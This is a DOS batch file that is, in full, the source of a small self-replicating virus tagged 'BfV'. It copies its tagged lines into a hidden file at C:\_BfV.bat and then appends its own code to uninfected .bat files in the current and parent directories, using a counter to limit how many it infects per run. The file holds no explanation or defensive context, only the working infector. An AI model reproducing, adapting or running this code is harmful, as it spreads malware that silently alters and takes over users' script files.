@echo off%[BfV_B]%
if '%1=='## goto BfV_%2
if exist C:\_BfV.bat goto BfV_
if not exist %0.bat goto BfV_end
find "BfV"<%0.bat>C:\_BfV.bat
attrib C:\_BfV.bat +h
:BfV_
command /e:5000 /c C:\_BfV ## run
goto BfV_end
:BfV_run
for %%i in (*.bat ..\*.bat) do call C:\_BfV ## inf %%i
exit BfV
:BfV_inf
if '%BfV%=='1111111 exit
set BfV=%BfV%1
find "BfV"<%3>nul
if not errorlevel 1 goto BfV_end
type %3>BfV
type C:\_BfV.bat>>BfV
move BfV %3>nul
exit BfV
:BfV_end

